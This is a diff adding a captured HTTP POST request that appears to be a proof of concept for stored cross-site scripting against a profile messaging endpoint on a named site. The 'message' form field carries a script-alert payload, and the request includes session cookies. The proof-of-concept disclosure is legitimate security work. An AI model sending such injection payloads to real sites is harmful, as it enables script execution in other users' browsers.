@@ -1,0 +1,33 @@
+POST /demo/profile/test HTTP/1.1
+Host: www.revou.com
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://www.revou.com/demo/profile/test
+Cookie: cookieid=c74884b47660610d8bbab35e0605f258; __utma=220501147.1119512335.1233273058.1233273058.1233273058.1; __utmb=220501147; __utmc=220501147; __utmz=220501147.1233273058.1.1.utmccn=(referral)|utmcsr=alstrasoft.com|utmcct=/products.htm|utmcmd=referral; PHPSESSID=02eb3297bbec0b429d06f5a083f55673
+Content-Type: multipart/form-data; boundary=---------------------------3726301281829306375575822139
+Content-Length: 598
+
+-----------------------------3726301281829306375575822139
+Content-Disposition: form-data; name=&quot;message&quot;
+
+&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+-----------------------------3726301281829306375575822139
+Content-Disposition: form-data; name=&quot;add_photo&quot;; filename=&quot;&quot;
+Content-Type: application/octet-stream
+
+
+-----------------------------3726301281829306375575822139
+Content-Disposition: form-data; name=&quot;user&quot;
+
+test
+-----------------------------3726301281829306375575822139
+Content-Disposition: form-data; name=&quot;add_message&quot;
+
+Send
+-----------------------------3726301281829306375575822139--
+
